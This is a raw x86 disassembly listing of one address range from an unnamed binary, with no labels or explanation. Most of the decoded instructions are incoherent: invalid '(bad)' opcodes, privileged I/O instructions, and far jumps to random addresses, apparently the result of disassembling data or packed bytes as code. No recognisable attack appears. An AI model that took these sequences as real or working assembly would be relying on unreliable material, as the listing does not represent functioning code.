  422ff8:	rol    eax,1
  422ffa:	pop    edx
  422ffb:	mov    esi,0x6810001
  423000:	add    BYTE PTR [eax],al
  423002:	test   BYTE PTR [ebx],al
  423004:	cmp    eax,0x1368b25e
  423009:	or     dl,BYTE PTR [esi-0x3f8035c6]
  42300f:	jge    0x422fba
  423011:	sbb    DWORD PTR [ecx+ebp*2],edi
  423014:	sub    BYTE PTR [eax+0x61],ah
  423017:	retf   0x3b98
  42301a:	xchg   edi,eax
  42301b:	jmp    0x423012
  42301d:	es call 0xc24323da
  423023:	or     al,bl
  423025:	popf   
  423026:	mov    edx,0xe83d2a2a
  42302b:	shl    BYTE PTR [eax],cl
  42302d:	fnstsw WORD PTR [edi]
  42302f:	inc    edi
  423030:	xchg   esi,eax
  423031:	stc    
  423032:	(bad)  
  423033:	bound  edi,QWORD PTR [edx+0x22]
  423036:	inc    ecx
  423037:	cmp    DWORD PTR ds:0x736a49c9,edi
  42303d:	add    eax,0xd6453893
  423042:	sbb    eax,0xd94d81db
  423047:	in     eax,dx
  423048:	and    eax,0x230a476e
  42304d:	xor    dh,ah
  42304f:	xchg   esi,eax
  423050:	ds call 0xd18231a7
  423056:	inc    edi
  423057:	std    
  423058:	fs loope 0x423046
  42305b:	jns    0x423028
  42305d:	lahf   
  42305e:	repz out 0x8e,al
  423061:	mov    ds:0x29103d0e,al
  423066:	mov    ah,0x73
  423068:	push   ebp
  423069:	xor    eax,ebp
  42306b:	test   al,0x77
  42306d:	push   edi
  42306e:	xlat   BYTE PTR ds:[ebx]
  42306f:	repz adc eax,0xae3a868
  423075:	ins    BYTE PTR es:[edi],dx
  423076:	adc    BYTE PTR [ecx+0x7d8bc68b],al
  42307c:	push   cs
  42307d:	out    0x81,eax
  42307f:	xor    ch,dh
  423081:	bound  eax,QWORD PTR [ecx+0x3b]
  423084:	into   
  423085:	cld    
  423086:	scas   eax,DWORD PTR es:[edi]
  423087:	ins    DWORD PTR es:[edi],dx
  423088:	nop
  423089:	jo     0x423038
  42308b:	(bad)  
  42308c:	mov    eax,0x4cce229c
  423091:	push   edx
  423092:	iret   
  423093:	cmp    eax,0x7b7d9c81
  423098:	(bad)  
  42309a:	gs xor bl,al
  42309d:	imul   edx,DWORD PTR [eax-0x586db59a],0xdfb5edf7
  4230a7:	cwde   
  4230a8:	mov    cs,WORD PTR [eax-0xe4d9c77]
  4230ae:	mov    ecx,0x83a3c0c8
  4230b3:	inc    ebp
  4230b4:	push   0x8478a649
  4230b9:	lahf   
  4230ba:	jbe    0x423079
  4230bc:	div    ch
  4230be:	mov    ebp,0xd206973
  4230c3:	pusha  
  4230c4:	daa    
  4230c5:	dec    ecx
  4230c6:	aad    0xdc
  4230c8:	fs into 
  4230ca:	(bad)  
  4230cb:	rol    bh,cl
  4230cd:	push   eax
  4230ce:	int3   
  4230cf:	jmp    0x42314b
  4230d1:	dec    esi
  4230d2:	lahf   
  4230d3:	mov    edi,0xbf46fb70
  4230d8:	cmp    cl,BYTE PTR [esi-0x51]
  4230db:	call   0xcec666ea
  4230e0:	mov    ds:0x44d30789,al
  4230e5:	out    dx,al
  4230e6:	nop
  4230e7:	aaa    
  4230e8:	addr16 inc esp
  4230ea:	jno    0x42310b
  4230ec:	xchg   dl,dl
  4230ee:	mov    WORD PTR [edi],cs
  4230f0:	add    eax,0xa0ceee77
  4230f5:	shl    edi,0xa4
  4230f8:	dec    ebx
  4230f9:	xchg   esp,eax
  4230fa:	call   0x79b3:0xebd1ae85
  423101:	xor    al,0x29
  423103:	push   edi
  423104:	shl    DWORD PTR [ebx-0x21],1
  423107:	stos   BYTE PTR es:[edi],al
  423108:	xor    BYTE PTR [esi+0x52b8c0a7],dl
  42310e:	jmp    0x2ab6c64f
  423113:	mov    dl,0xf8
  423115:	leave  
  423116:	aaa    
  423117:	cli    
  423118:	sbb    DWORD PTR [ebx],edi
  42311a:	mov    cr7,eax
  42311d:	outs   dx,DWORD PTR ds:[esi]
  42311e:	pop    edx
  42311f:	cmp    DWORD PTR [ecx],ecx
  423121:	into   
  423122:	xlat   BYTE PTR ds:[ebx]
  423123:	ja     0x4230d3
  423125:	mov    ecx,0x367579d9
  42312a:	fcom   DWORD PTR [edi-0x6f]
  42312d:	fisttp QWORD PTR [esi-0x197186a7]
  423133:	std    
  423134:	out    0x50,eax
  423136:	stc    
  423137:	or     DWORD PTR [esi-0x49],0x29
  42313b:	jae    0x4231ab
  42313d:	add    edi,eax
  42313f:	cmp    DWORD PTR [ebp+0x5899a6a5],ebp
  423145:	xor    ah,BYTE PTR [esi+0x1d]
  423148:	jecxz  0x423114
  42314a:	ss xor al,0x62
  42314d:	mov    bl,0xd2
  42314f:	xchg   ecx,eax
  423150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423151:	in     eax,0xe9
  423153:	dec    esp
  423154:	push   eax
  423155:	inc    esi
  423156:	mov    bl,0xa
  423158:	sub    DWORD PTR [edi+eiz*8+0x564bb151],esp
  42315f:	sbb    bh,BYTE PTR [ecx+0x40]
  423162:	sbb    al,0x44
  423164:	sbb    eax,esi
  423166:	mov    ebp,0x3b12d8c1
  42316b:	inc    ebx
  42316c:	imul   esi,DWORD PTR [ebx+0x460b892d],0x45
  423173:	fnsave [esi+0x3e4fca60]
  423179:	or     dh,cl
  42317b:	mov    ebp,0xcdc8e057
  423180:	aaa    
  423181:	jbe    0x4231f9
  423183:	pop    ds
  423184:	sbb    bl,cl
  423186:	xlat   BYTE PTR ds:[ebx]
  423187:	jg     0x423179
  423189:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42318a:	or     eax,0x36fb59a6
  42318f:	arpl   WORD PTR [edi+0x41a3e786],ax
  423195:	sbb    al,dh
  423197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423198:	adc    al,BYTE PTR [esi-0x3297d021]
  42319e:	add    BYTE PTR [edi],bh
  4231a0:	xchg   BYTE PTR [esp+esi*1-0x162d845e],cl
  4231a7:	nop
  4231a8:	jns    0x4231ff
  4231aa:	arpl   bx,dx
  4231ac:	ss mov bl,0xe4
  4231af:	xor    BYTE PTR [esi+eiz*8-0x47412d2d],ch
  4231b6:	jns    0x423177
  4231b8:	jb     0x423232
  4231ba:	push   edi
  4231bb:	sbb    bl,BYTE PTR [esi]
  4231bd:	cmc    
  4231be:	mov    ch,0x2
  4231c0:	in     eax,dx
  4231c1:	arpl   WORD PTR [esi],sp
  4231c3:	inc    ebp
  4231c4:	xor    ebx,edi
  4231c6:	push   cs
  4231c7:	mov    al,0x92
  4231c9:	ret    0xbea4
  4231cc:	push   ebx
  4231cd:	sub    ecx,DWORD PTR [ecx-0x7c]
  4231d0:	mov    ds:0x7322af66,al
  4231d5:	or     bl,BYTE PTR [ecx-0x39e292da]
  4231db:	xor    eax,0x126fecbb
  4231e0:	adc    BYTE PTR [edi-0x175a0f4c],cl
  4231e6:	popa   
  4231e7:	addr16 test edx,edx
  4231ea:	lea    edx,[edi-0x4645c8c8]
  4231f0:	pop    ss
  4231f1:	outs   dx,BYTE PTR ds:[esi]
  4231f2:	mov    esp,0x651aef8d
  4231f7:	mov    ds:0x76ba0326,eax
  4231fc:	int3   
  4231fd:	popa   
  4231fe:	add    BYTE PTR [edi+0x7be20178],bl
  423204:	xchg   esi,eax
  423205:	call   0x4d8:0x569409f9
  42320c:	add    edi,ecx
  42320e:	int3   
  42320f:	sub    eax,0xd29428ef
  423214:	mov    ecx,0x96dd8da5
  423219:	cmp    DWORD PTR [edi+0x4a],eax
  42321c:	stc    
  42321d:	in     eax,0x3e
  42321f:	adc    eax,DWORD PTR [ebx+0x43]
  423222:	dec    DWORD PTR [edx+0x4a]
  423225:	fs jp  0x423263
  423228:	jecxz  0x423252
  42322a:	jge    0x423235
  42322c:	sub    al,0x82
  42322e:	sub    dh,dl
  423230:	mov    ?,esp
  423232:	dec    edi
  423233:	shl    BYTE PTR [edi+0x4c0e1ba1],cl
  423239:	jmp    0x71b8e88e
  42323e:	outs   dx,DWORD PTR ds:[esi]
  42323f:	mov    bh,0xe6
  423241:	bound  ecx,QWORD PTR [edx+ebx*8]
  423244:	mov    bh,0xf9
  423246:	push   ebx
  423247:	lock call 0xf85c662f
  42324d:	inc    edx
  42324e:	sub    BYTE PTR [ebx],ch
  423250:	jmp    0x8eb7f82
  423255:	or     DWORD PTR [edx],edi
  423257:	add    DWORD PTR [ecx+0x842f0d6],esi
  42325d:	jge    0x423271
  42325f:	ds jno 0x4231e7
  423262:	push   edx
  423263:	mov    ds:0x2608b0ba,eax
  423268:	jnp    0x423262
  42326a:	cs in  al,dx
  42326c:	fwait
  42326d:	punpcklbw mm2,mm2
  423270:	mov    BYTE PTR [ecx-0x56d79421],bl
  423276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423277:	ret    0xd22c
  42327a:	stc    
  42327b:	repnz inc ebx
  42327d:	fisub  WORD PTR [edi-0x69]
  423280:	std    
  423281:	(bad)  
  423282:	mul    dh
  423284:	aaa    
  423285:	es add eax,0xfaa8e3ba
  42328b:	rcl    esi,1
  42328d:	sbb    ah,BYTE PTR [ecx+0x1714e62d]
  423293:	mov    ds:0x813bf337,al
  423298:	and    ebx,0xffffff98
  42329b:	cmp    DWORD PTR [ebp+0x9],edx
  42329e:	dec    edi
  42329f:	add    edx,ecx
  4232a1:	push   ecx
  4232a2:	dec    ebx
  4232a3:	dec    ebp
  4232a4:	mov    cl,0x41
  4232a6:	xchg   DWORD PTR [esi+ecx*4],ebx
  4232a9:	data16 adc al,dh
  4232ac:	mov    WORD PTR [ecx],cs
  4232ae:	lods   eax,DWORD PTR ds:[esi]
  4232af:	mov    esp,0x52e17b4d
  4232b4:	(bad)  
  4232b5:	stos   DWORD PTR es:[edi],eax
  4232b6:	mov    ss,WORD PTR [ecx-0x3cbf906f]
  4232bc:	outs   dx,DWORD PTR ds:[esi]
  4232bd:	xor    cl,0x85
  4232c0:	mov    cl,0x55
  4232c2:	lods   al,BYTE PTR ds:[esi]
  4232c3:	call   0x72df96cb
  4232c8:	mov    al,0xbc
  4232ca:	push   edx
  4232cb:	cwde   
  4232cc:	mov    ah,0x33
  4232ce:	int    0x5a
  4232d0:	or     eax,0x186d490f
  4232d5:	jecxz  0x423288
  4232d7:	push   0x46
  4232d9:	(bad)  
  4232db:	lea    edx,[ebp-0x245257dc]
  4232e1:	mov    ds:0x54cf6d26,eax
  4232e6:	inc    ebp
  4232e7:	test   BYTE PTR [edx-0x26332536],cl
  4232ed:	or     DWORD PTR [ebx+0x18e82fb2],ecx
  4232f3:	push   0x653cc530
  4232f8:	outs   dx,DWORD PTR ds:[esi]
  4232f9:	das    
  4232fa:	(bad)  
  4232fb:	lahf   
  4232fc:	rcl    DWORD PTR [ebp+esi*1-0x53],1
  423300:	xor    al,0x21
  423302:	mov    dh,0x1f
  423304:	pusha  
  423305:	cmp    al,0x96
  423307:	push   ecx
  423308:	ficomp DWORD PTR [ebx]
  42330a:	mov    eax,ds:0x14f319bb
  42330f:	jg     0x4232b6
  423311:	inc    eax
  423312:	aad    0xd0
  423314:	loope  0x4232d1
  423316:	sbb    DWORD PTR [eax],0x5a390e78
  42331c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42331d:	push   eax
  42331e:	sub    bl,BYTE PTR [eax-0x3c]
  423321:	mov    bh,0xf7
  423323:	or     ch,BYTE PTR [ebp-0x1633e62c]
  423329:	xchg   esp,eax
  42332a:	jmp    0x2ea1:0x88c35069
  423331:	sub    ch,dh
  423333:	jle    0x423340
  423335:	imul   edx,esp,0x630ece8
  42333b:	or     DWORD PTR [ebp+0x63707749],esi
  423341:	adc    eax,0x5b6e9a2c
  423346:	cmp    ebp,DWORD PTR [esi+0x71]
  423349:	repz scas al,BYTE PTR es:[di]
  42334c:	fiadd  DWORD PTR [edx]
  42334e:	mov    bl,0x9a
  423350:	(bad)  
  423351:	fwait
  423352:	repz mov eax,ds:0x92cf9363
  423358:	cmp    DWORD PTR ds:0x34cddea0,ebp
  42335e:	mov    DWORD PTR [ebp+ebx*4-0x12],eax
  423362:	leave  
  423363:	and    al,0x17
  423365:	push   0x5cd4325c
  42336a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42336b:	scas   al,BYTE PTR es:[edi]
  42336c:	retf   
  42336d:	(bad)  
  42336e:	push   esp
  42336f:	pop    es
  423370:	dec    ecx
  423371:	xor    BYTE PTR [esp+eax*4],bl
  423374:	or     ebx,DWORD PTR [esi+0x7671337e]
  42337a:	jmp    0x6dcf:0x502c5c9d
  423381:	add    esp,esi
  423383:	inc    edi
  423384:	pop    esi
  423385:	scas   al,BYTE PTR es:[edi]
  423386:	call   0x6dae61bd
  42338b:	sbb    al,0xff
  42338d:	sbb    DWORD PTR [edi+0x314a15bf],ecx
  423393:	or     eax,0xa6dd2c1d
  423398:	pop    edx
  423399:	push   esp
  42339a:	(bad)
  42339d:	test   eax,0xd76c6732
  4233a2:	inc    esp
  4233a3:	or     ch,ch
  4233a5:	mov    al,ds:0xc9867a60
  4233aa:	xor    ebx,esi
  4233ac:	jmp    0x5d5b:0x7d66db85
  4233b3:	add    BYTE PTR ds:0x52856c9e,bh
  4233b9:	js     0x42340a
  4233bb:	adc    bh,al
  4233bd:	arpl   WORD PTR [eax+edx*8+0x71],si
  4233c1:	add    ebx,esi
  4233c3:	and    ch,BYTE PTR [ecx+edx*1]
  4233c6:	xor    eax,0xb1daf81c
  4233cb:	xor    edx,esi
  4233cd:	shl    ch,0x84
  4233d0:	inc    edi
  4233d1:	adc    DWORD PTR [edx+0x30],ebx
  4233d4:	mov    al,ds:0xb8e4dd6b
  4233d9:	xchg   esi,eax
  4233da:	das    
  4233db:	test   DWORD PTR ds:0x42c8d7fd,esp
  4233e1:	das    
  4233e2:	dec    ebx
  4233e3:	xor    BYTE PTR fs:[eax-0x8],0xa3
  4233e8:	cwde   
  4233e9:	pop    edi
  4233ea:	addr16 dec ebx
  4233ec:	sub    al,0x8a
  4233ee:	and    BYTE PTR [esi],al
  4233f0:	mov    ecx,0x6a17f0f3
  4233f5:	loop   0x42341c
  4233f7:	lods   al,BYTE PTR fs:[esi]
  4233f9:	dec    esi
  4233fa:	je     0x423386
  4233fc:	push   0xffffff85
  4233fe:	xlat   BYTE PTR ds:[ebx]
  4233ff:	xor    BYTE PTR [edi-0x37a8b345],0x10
  423406:	das    
  423407:	stc    
  423408:	pop    ebx
  423409:	add    eax,0x1d1df464
  42340e:	jne    0x4233cc
  423410:	jae    0x4233df
  423412:	(bad)  
  423413:	jmp    0x29f4f70a
  423418:	fs jae 0x423418
  42341b:	shl    DWORD PTR [ecx+0x6e],0xf0
  42341f:	test   BYTE PTR [ebp+0x59f85c9d],0x9
  423426:	jae    0x4233be
  423428:	enter  0x4abf,0x55
  42342c:	loope  0x423477
  42342e:	xor    BYTE PTR [ebx],dl
  423430:	test   DWORD PTR [ebx-0x3e],ebp
  423433:	inc    eax
  423434:	loopne 0x423486
  423436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423438:	int3   
  423439:	push   0xffffffce
  42343b:	jmp    0x4233f7
  42343d:	outs   dx,DWORD PTR ds:[esi]
  42343e:	arpl   WORD PTR [ebp+ecx*4+0x4316ea0a],dx
  423445:	push   eax
  423446:	fwait
  423447:	into   
  423448:	rcl    dh,cl
  42344a:	rcl    cl,cl
  42344c:	shl    DWORD PTR [ebx-0x38],cl
  42344f:	pop    esp
  423450:	lock mov cs,WORD PTR [ebp-0x660cde2]
  423457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423458:	cmp    BYTE PTR [ecx-0x592d5fab],dl
  42345e:	jnp    0x42345c
  423460:	(bad)  
  423461:	int3   
  423462:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423463:	push   es
  423464:	clc    
  423465:	mov    ah,0xea
  423467:	adc    ebx,DWORD PTR [edi+esi*2+0x9]
  42346b:	xchg   esi,eax
  42346c:	dec    edi
  42346d:	lea    ebx,[esi]
  42346f:	fimul  WORD PTR [edi+0x61453169]
  423475:	call   0xcc86:0x6eca21a2
  42347c:	retf   
  42347d:	jnp    0x423482
  42347f:	inc    ecx
  423480:	jle    0x42343f
  423482:	fild   WORD PTR [ebx+0x70]
  423485:	jmp    0xff7fdc63
  42348a:	pop    edi
  42348b:	cmp    cl,BYTE PTR [ecx+0x0]
  42348e:	(bad)  
  42348f:	loope  0x42346f
  423491:	adc    eax,0xe3f075d4
  423496:	test   eax,0xd7d6a44b
  42349b:	jmp    0x3c963f7b
  4234a0:	fsub   DWORD PTR [edx-0x4]
  4234a3:	sub    ch,BYTE PTR [ebp-0x44]
  4234a6:	inc    eax
  4234a7:	inc    eax
  4234a8:	ror    BYTE PTR [eax],1
  4234aa:	cmp    al,0x6b
  4234ac:	push   ecx
  4234ad:	add    al,0xa2
  4234af:	or     edi,DWORD PTR [ebx+0x3ab16d35]
  4234b5:	(bad)  
  4234b7:	jns    0x42345a
  4234b9:	xlat   BYTE PTR ds:[ebx]
  4234ba:	or     ebp,esp
  4234bc:	mov    ds:0x264a9580,eax
  4234c1:	test   dh,bl
  4234c3:	shl    DWORD PTR [esi-0x55a06358],0xad
  4234ca:	jb     0x423472
  4234cc:	loope  0x42350d
  4234ce:	ds int 0xb7
  4234d1:	rep ins DWORD PTR es:[edi],dx
  4234d3:	push   edi
  4234d4:	pop    ecx
  4234d5:	lea    edi,es:[ecx+0x46]
  4234d9:	adc    al,0x90
  4234db:	jae    0x423469
  4234dd:	inc    edx
  4234de:	jecxz  0x42350a
  4234e0:	adc    eax,0x8f706f08
  4234e5:	es clc 
  4234e7:	inc    ecx
  4234e8:	mov    ebx,0xe4d0eb68
  4234ed:	ins    BYTE PTR es:[edi],dx
  4234ee:	mov    al,ds:0xa3e48163
  4234f3:	retf   0x7b4f
  4234f6:	fdivr  QWORD PTR [edx+esi*8+0x66]
  4234fa:	daa    
  4234fb:	pop    esi
  4234fc:	cmp    esi,eax
  4234fe:	xchg   esp,eax
  4234ff:	pop    es
  423500:	jne    0x4234f6
  423502:	add    eax,0x42c9e599
  423507:	div    DWORD PTR [ecx-0x2]
  42350a:	aam    0xde
  42350c:	ds call 0x3bad456
  423512:	mov    edi,0x7702c7c5
  423517:	int    0x43
  423519:	push   ds
  42351a:	outs   dx,DWORD PTR ds:[esi]
  42351b:	dec    ecx
  42351c:	adc    eax,0x6675dedd
  423521:	mov    DWORD PTR [edx+0x36],esi
  423524:	xor    bl,BYTE PTR [edx]
  423526:	add    BYTE PTR [edx+0x7dd869ae],ah
  42352c:	imul   edi,DWORD PTR [edx-0x55],0xfffffffd
  423530:	not    BYTE PTR [edi]
  423532:	imul   edi,DWORD PTR [ecx+eiz*2],0xce329db1
  423539:	fistp  WORD PTR [esi-0x4f9f82c8]
  42353f:	pop    ecx
  423540:	out    dx,eax
  423541:	xor    esi,DWORD PTR [eax-0x6bffba9]
  423547:	xchg   edi,eax
  423548:	and    dl,dl
  42354a:	jge    0x423542
  42354c:	sbb    ebx,DWORD PTR [esi+0xb]
  42354f:	push   cs
  423550:	jno    0x4235a8
  423552:	imul   edi,DWORD PTR [ebx-0xd1b56db],0xe80c0a7b
  42355c:	ror    cl,1
  42355e:	jp     0x42356e
  423560:	sbb    bh,ch
  423562:	fist   WORD PTR [eax]
  423564:	mov    cl,0xed
  423566:	pop    ds
  423567:	gs push ss
  423569:	add    ecx,DWORD PTR [edx+0x4dd1570e]
  42356f:	icebp  
  423570:	mov    eax,0x5af2de56
  423575:	cs jns 0x423587
  423578:	sub    cl,BYTE PTR [eax+0x72]
  42357b:	fisttp WORD PTR [ebp-0x79]
  42357e:	jmp    0x5ddc:0xafc39e45
  423585:	dec    ebx
  423586:	inc    ebp
  423587:	xor    eax,0x734639aa
  42358c:	mov    BYTE PTR [eax+0x6b],bh
  42358f:	into   
  423590:	jno    0x423562
  423592:	mov    dh,0x86
  423594:	push   ds
  423595:	pop    es
  423596:	sbb    eax,edx
  423598:	add    al,0xfc
  42359a:	outs   dx,BYTE PTR ds:[esi]
  42359b:	ret    0x42d0
  42359e:	sbb    DWORD PTR [ebx],edi
  4235a0:	in     al,dx
  4235a1:	cli    
  4235a2:	inc    ecx
  4235a3:	test   BYTE PTR [edx],cl
  4235a5:	pop    es
  4235a6:	pop    edi
  4235a7:	rol    BYTE PTR [ebp+0x35],1
  4235aa:	ins    DWORD PTR es:[edi],dx
  4235ab:	xlat   BYTE PTR ds:[ebx]
  4235ac:	pop    esp
  4235ad:	mov    al,ds:0xb31ca0a5
  4235b2:	and    edi,DWORD PTR [edx]
  4235b4:	in     al,0xc8
  4235b6:	out    dx,eax
  4235b7:	or     al,0x94
  4235b9:	and    DWORD PTR [edi],0xffffffe5
  4235bc:	jmp    0x73d2:0xc95b544e
  4235c3:	test   al,0xc8
  4235c5:	iret   
  4235c6:	dec    edi
  4235c7:	and    al,0x32
  4235c9:	clc    
  4235ca:	cmp    eax,0xcad406bb
  4235cf:	dec    esi
  4235d0:	cli    
  4235d1:	sbb    eax,0x718a8b44
  4235d6:	addr16 mov edx,0xf0b383f5
  4235dc:	cdq    
  4235dd:	push   esp
  4235de:	xchg   esi,eax
  4235df:	pop    ebp
  4235e0:	or     dh,BYTE PTR [ebx+eax*4]
  4235e3:	xor    BYTE PTR [esi],bl
  4235e5:	push   ds
  4235e6:	test   esi,0x69f9e93d
  4235ec:	dec    esp
  4235ed:	mov    al,0xcf
  4235ef:	adc    eax,0xca95cb69
  4235f4:	and    cl,BYTE PTR [edx]
  4235f6:	leave  
  4235f7:	je     0x423662
  4235f9:	lahf   
  4235fa:	sbb    BYTE PTR ss:[edx-0x32f4471c],bl
  423601:	pusha  
  423602:	test   BYTE PTR [edx+0x45c6679a],bh
  423608:	in     eax,0xa7
  42360a:	add    eax,0x2a17253e
  42360f:	add    ah,dh
  423611:	arpl   cx,sp
  423613:	dec    eax
  423614:	pop    edi
  423615:	dec    edx
  423616:	xor    BYTE PTR [ebp+0x3ab71ac9],ch
  42361c:	fistp  DWORD PTR [ebx-0x76]
  42361f:	jbe    0x423679
  423621:	cmp    bh,bh
  423623:	push   0xffffffd2
  423625:	(bad)  
  423628:	aam    0x29
  42362a:	adc    ebx,esp
  42362c:	or     esp,ecx
  42362e:	push   esi
  42362f:	or     ecx,DWORD PTR [ebx-0x6e598aff]
  423635:	popf   
  423636:	scas   eax,DWORD PTR es:[edi]
  423637:	gs push ebx
  423639:	daa    
  42363a:	fmul   QWORD PTR [ebp-0x40]
  42363d:	lahf   
  42363e:	jge    0x423655
  423640:	xchg   esi,eax
  423641:	sbb    ch,BYTE PTR [ecx]
  423643:	fsubr  st,st(7)
  423645:	out    0x7,al
  423647:	mov    cl,0xcf
  423649:	fst    DWORD PTR [ebx]
  42364b:	adc    al,0x22
  42364d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42364e:	ins    DWORD PTR es:[edi],dx
  42364f:	sahf   
  423650:	ins    DWORD PTR es:[edi],dx
  423651:	sahf   
  423652:	std    
  423653:	mov    dl,0xac
  423655:	inc    esi
  423656:	into   
  423657:	pop    esp
  423658:	stos   DWORD PTR es:[edi],eax
  423659:	fisub  DWORD PTR [edi+0xb]
  42365c:	xchg   esi,eax
  42365d:	inc    ebx
  42365e:	mov    eax,0x2be1d0bb
  423663:	stos   BYTE PTR es:[edi],al
  423664:	fst    DWORD PTR [esi-0x16]
  423667:	fwait
  423668:	push   cs
  423669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42366a:	pushf  
  42366b:	into   
  42366c:	sub    al,0x1b
  42366e:	fimul  WORD PTR [ebx+ebp*2]
  423671:	or     al,0x3c
  423673:	mov    cl,0xfd
  423675:	or     DWORD PTR [edi+0x6a59a0aa],0x62f1f0bb
  42367f:	inc    ecx
  423680:	cmc    
  423681:	addr16 jmp 0x423687
  423687:	add    BYTE PTR [eax],al
  423689:	add    BYTE PTR [eax+0x59],bl
  42368c:	dec    ebx
  42368d:	push   ebp
  42368e:	dec    ebx
  42368f:	push   edi
  423690:	pop    esi
  423691:	pop    ebp
  423692:	mov    ebx,0xf6a42923
  423697:	jl     0x423628
  423699:	mov    ebp,0x1c4db
  42369e:	add    DWORD PTR [esi],0xcba80000
  4236a4:	fldenv [ecx-0x7671efdd]
  4236aa:	lods   eax,DWORD PTR ds:[esi]
  4236ab:	add    DWORD PTR [eax],edx
  4236ad:	leave  
  4236ae:	mov    ebx,0x9ddba247
  4236b3:	push   ds
  4236b4:	mov    esp,0x8e05c370
  4236b9:	xor    ch,BYTE PTR [ebx+0x6a232126]
  4236bf:	pop    ebp
  4236c0:	add    BYTE PTR [edi-0x41],ch
  4236c3:	jge    0x4236ef
  4236c5:	gs jle 0x423648
  4236c8:	cld    
  4236c9:	loop   0x4236ac
  4236cb:	stos   BYTE PTR es:[edi],al
  4236cc:	arpl   WORD PTR ds:0x304aff00,bp
  4236d2:	or     al,0x43
  4236d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236d5:	lods   eax,DWORD PTR ds:[esi]
  4236d6:	cmp    ebp,DWORD PTR [eax-0x167924db]
  4236dc:	iret   
  4236dd:	add    esi,DWORD PTR [eax-0x4db9b19]
  4236e3:	jl     0x423755
  4236e5:	cmc    
  4236e6:	or     esi,edi
  4236e8:	mov    edi,0x170610a4
  4236ed:	inc    eax
  4236ee:	repnz retf 
  4236f0:	dec    eax
  4236f1:	ss stos BYTE PTR es:[edi],al
  4236f3:	repz push ebx
  4236f5:	or     edi,DWORD PTR [edi]
  4236f7:	and    esi,DWORD PTR [ebp+0x6b]
  4236fa:	sub    BYTE PTR [eax+0x5f],cl
  4236fd:	adc    BYTE PTR [ebp+0x17],ch
  423700:	outs   dx,DWORD PTR ds:[esi]
  423701:	inc    ebp
  423702:	inc    ebp
  423703:	mov    dh,0xce
  423705:	mov    esi,esi
  423707:	outs   dx,BYTE PTR ds:[esi]
  423708:	outs   dx,BYTE PTR ds:[esi]
  423709:	mov    al,0x1
  42370b:	lahf   
  42370c:	pusha  
  42370d:	or     BYTE PTR [ebx+0x99069bf],dl
  423713:	pop    eax
  423714:	xor    esp,edx
  423716:	mov    bl,0x54
  423718:	aam    0x86
  42371a:	ins    DWORD PTR es:[edi],dx
  42371b:	mov    ds:0xb654fb85,al
  423720:	adc    edx,DWORD PTR [ebx-0x527bd058]
  423726:	(bad)  
  423727:	ins    DWORD PTR es:[edi],dx
  423728:	sbb    dl,ch
  42372a:	and    BYTE PTR [eax],ch
  42372c:	or     ebx,DWORD PTR [edi+0x1bcefc94]
  423732:	jg     0x4236e5
  423734:	mov    eax,ds:0x4e6c8f72
  423739:	scas   eax,DWORD PTR es:[edi]
  42373a:	sbb    DWORD PTR [ebp+0x72a15c37],0x132d8e09
  423744:	mov    al,0x36
  423746:	xchg   edx,eax
  423747:	cmp    esi,DWORD PTR [esi+edi*8-0x46]
  42374b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42374c:	adc    BYTE PTR [edx-0x7d],cl
  42374f:	sub    BYTE PTR [ebx+ebx*2-0x43],al
  423753:	mov    al,ds:0x48a0028f
  423758:	sbb    al,0x64
  42375a:	pop    es
  42375b:	std    
  42375c:	xor    eax,ebp
  42375e:	xchg   DWORD PTR [esi+0x57],eax
  423761:	in     al,dx
  423762:	cmp    ecx,0xffffffe6
  423765:	push   0x77
  423767:	pop    edi
  423768:	mov    esi,0xa5a257c9
  42376d:	dec    ecx
  42376e:	xchg   edi,eax
  42376f:	adc    eax,0x5e020a15
  423774:	jo     0x4237ee
  423776:	fimul  DWORD PTR [esi-0x50]
  423779:	pop    edx
  42377a:	rcl    DWORD PTR [eax-0x5a],cl
  42377d:	rcl    DWORD PTR [esi+0x55],cl
  423780:	(bad)  
  423781:	test   BYTE PTR fs:[esi+0x47],ah
  423785:	imul   BYTE PTR [ebp+0x37b170aa]
  42378b:	fst    QWORD PTR [edx-0x42dc0f49]
  423791:	jno    0x42377a
  423793:	push   esi
  423794:	and    eax,0x994d6511
  423799:	in     al,dx
  42379a:	mov    ebp,0x62626c55
  42379f:	addr16 (bad) 
  4237a1:	and    ecx,edx
  4237a3:	inc    esi
  4237a4:	pop    edi
  4237a5:	xchg   edx,eax
  4237a6:	mov    ah,0xad
  4237a8:	les    esi,FWORD PTR [eax-0x2836a207]
  4237ae:	fmul   QWORD PTR [esi+0x56]
  4237b1:	add    eax,0x80630644
  4237b6:	aas    
  4237b7:	dec    ebp
  4237b8:	sbb    DWORD PTR [eax+0x53eca815],0xa5f0a23b
  4237c2:	adc    DWORD PTR [ebx+0x1],ecx
  4237c5:	mov    eax,DWORD PTR [edx+0x7c]
  4237c8:	aas    
  4237c9:	mov    bh,0xeb
  4237cb:	xchg   esi,eax
  4237cc:	jmp    0x423803
  4237ce:	ja     0x4237fc
  4237d0:	imul   DWORD PTR gs:[eax+0x591d1b08]
  4237d7:	mov    eax,0x5a3ab9b2
  4237dc:	test   eax,0x964a66f6
  4237e1:	mov    dl,0x53
  4237e3:	sbb    ebx,ebx
  4237e5:	adc    ah,dh
  4237e7:	aaa    
  4237e8:	shl    BYTE PTR [ebp-0x3b],cl
  4237eb:	or     eax,0x4090af53
  4237f0:	ja     0x4237bb
  4237f2:	push   esp
  4237f3:	mov    WORD PTR [esi+0x23],?
  4237f6:	jmp    0x2106f945
  4237fb:	mov    esi,0x9c26548c
  423800:	es push eax
  423802:	les    eax,FWORD PTR [ecx]
  423804:	sbb    ebp,ebx
  423806:	ins    DWORD PTR es:[edi],dx
  423807:	sbb    dh,cl
  423809:	dec    eax
  42380a:	xchg   esp,eax
